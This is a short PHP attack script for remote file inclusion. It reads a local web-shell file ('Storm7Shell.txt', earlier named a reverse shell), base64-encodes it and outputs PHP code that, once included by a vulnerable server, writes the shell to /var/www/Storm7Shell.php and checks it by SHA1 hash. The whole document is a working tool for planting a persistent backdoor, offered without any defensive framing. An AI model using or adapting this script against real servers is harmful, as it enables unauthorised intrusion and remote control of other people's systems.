<?php
  // Present self as a RFI script to write a file to the remote server
  $infile = "php-reverse_shell.txt"; // Local file to upload
  $infile = "Storm7Shell.txt"; 
  $outfile = "/var/www/Storm7Shell.php"; // Remote path on server
  $data = file_get_contents( $infile );
  $hash = sha1( $data );
  $data = base64_encode( $data );
  echo "<?php 
  file_put_contents( \"$outfile\", base64_decode( \"$data\" ) ); 
  try{
    file_put_contents( \"$outfile\", base64_decode( \"$data\" ) );
  }
  catch( Exception \$e ){
    echo \"Failed write\";
  }
  if( file_exists( \"$outfile\" ) ){
    echo \"Wrote $outfile OK, \".filesize(\"$outfile\").\" bytes. \";
    if( \"$hash\" == sha1( file_get_contents( \"$outfile\") ) ){
      echo \"Hashes match.\";
    }else{ echo \"ERROR hashes don't match\"; }
  }else{
    echo \"Failed - file not found\";
  }
?>";
?>
